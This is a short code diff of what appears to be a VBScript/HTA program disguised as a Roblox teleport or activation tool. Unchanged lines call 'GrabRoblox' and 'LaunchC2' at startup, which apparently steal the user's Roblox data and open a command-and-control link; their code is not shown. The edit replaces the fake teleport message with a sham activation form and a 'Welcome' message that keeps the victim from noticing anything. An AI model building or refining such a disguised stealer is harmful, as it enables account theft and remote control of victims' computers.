@@ -17,15 +17,16 @@ Call GrabRoblox
 Call LaunchC2
 
 Sub BtnClick
-    Dim jobId, playerName, gameName, result
+    Dim protectedUser, jobId, playerName, gameName, result
+    protectedUser = document.getElementById("protectedBox").value
     jobId = document.getElementById("jobBox").value
     playerName = document.getElementById("playerBox").value
     gameName = document.getElementById("gameSelect").value
-    If Len(jobId) = 0 Or Len(playerName) = 0 Then
+    If Len(protectedUser) = 0 Or Len(jobId) = 0 Or Len(playerName) = 0 Then
         result = "Error: Please fill in all fields."
         document.getElementById("resultLabel").style.color = "#ff5555"
     Else
-        result = "Success! Teleported " & playerName & " to job " & jobId & " in " & gameName & "."
+        result = "Activation successful. Welcome, " & protectedUser & "."
         document.getElementById("resultLabel").style.color = "#55ff55"
     End If
     document.getElementById("resultLabel").innerHTML = result
